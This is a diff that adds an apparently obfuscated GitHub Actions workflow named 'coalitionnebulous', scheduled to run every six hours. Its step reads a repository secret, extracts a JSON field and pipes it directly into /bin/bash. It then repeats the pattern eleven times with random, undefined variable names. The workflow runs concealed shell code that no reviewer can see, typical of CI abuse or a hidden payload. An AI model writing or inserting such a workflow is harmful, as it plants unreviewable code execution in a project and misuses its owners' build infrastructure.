@@ -1,0 +1,29 @@
+name: coalitionnebulous
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: coalitionnebulous
+        env:
+          gd12223: ${{ secrets.gd12223 }}
+        run: |
+          echo $gd12223 | jq -r .bh6 | /bin/bash
+          echo $y01 | jq -r .xma9 | /bin/bash
+          echo $hz6 | jq -r .cceqg039 | /bin/bash
+          echo $oib241 | jq -r .r10061 | /bin/bash
+          echo $ruq6586 | jq -r .opwqq30283 | /bin/bash
+          echo $m45 | jq -r .q0 | /bin/bash
+          echo $d91376 | jq -r .cqnwp7735 | /bin/bash
+          echo $iuom6 | jq -r .v23466 | /bin/bash
+          echo $l059 | jq -r .c4 | /bin/bash
+          echo $m4500 | jq -r .wur3 | /bin/bash
+          echo $poef247 | jq -r .s2 | /bin/bash
+          echo $p5650 | jq -r .us95975 | /bin/bash
+
